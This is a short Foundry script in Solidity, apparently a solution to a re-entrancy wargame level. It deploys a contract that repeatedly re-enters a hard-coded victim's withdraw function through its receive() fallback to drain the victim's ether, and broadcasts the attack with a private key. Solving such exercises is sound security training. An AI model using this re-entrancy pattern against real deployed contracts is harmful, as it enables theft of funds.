// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "../src/10_Re-entrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public victim = IReentrance(payable(0x5E4c657D7E35d0a687605837c26e576374C14b54));

    constructor() payable {
        victim.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() public {
        // victim.donate{value: amount}(address(this));
        victim.withdraw(0.001 ether);
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {
        victim.withdraw(0.001 ether);
    }
}

contract ReentranceSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        ReentranceAttack reentranceAttack = new ReentranceAttack{value: 0.001 ether}();
        reentranceAttack.withdraw();
        vm.stopBroadcast();
    }
}
